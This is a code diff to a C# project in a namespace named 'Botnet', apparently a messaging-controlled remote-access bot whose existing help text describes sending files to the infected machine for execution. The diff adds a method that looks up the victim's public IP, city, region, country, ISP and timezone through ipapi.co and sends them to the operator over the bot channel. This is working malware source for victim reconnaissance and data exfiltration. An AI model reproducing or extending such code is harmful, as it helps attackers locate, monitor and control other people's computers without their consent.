@@ -15,6 +15,8 @@ using System.Windows.Forms;
 using Captura;
 using System.Data;
 using System.Data.SQLite;
+using Newtonsoft.Json;
+using RestSharp;
 
 namespace Botnet
 {
@@ -355,6 +357,31 @@ namespace Botnet
                 "If you wonna just send a file without execute you can simply send this file without any caption\n" +
                 "If you are sending audio, photo or video file send it like a file/help - get command list";
             ts.SendMessage(response);
+        }
+
+        public void GetProviderData()
+        {
+            string link = "https://ipapi.co/json/";
+            string strIpLocation = " ";
+            var client = new RestClient(link);
+            var request = new RestRequest()
+            {
+                Method = Method.GET
+            };
+
+            var response = client.Execute(request);
+
+            var providerData = JsonConvert.DeserializeObject<ProviderData>(response.Content);
+
+            strIpLocation = $"IP: {providerData.IP}\r\n" +
+                $"City: {providerData.City}\r\n" +
+                $"Region: {providerData.Region}\r\n" +
+                $"Country: {providerData.Country}\r\n" +
+                $"Org: {providerData.Org}\r\n" +
+                $"Calling code: {providerData.CallingCode}\r\n" +
+                $"Timezone: {providerData.Timezone}\r\n";
+
+            ts.SendMessage(strIpLocation);
         }
     }
 }
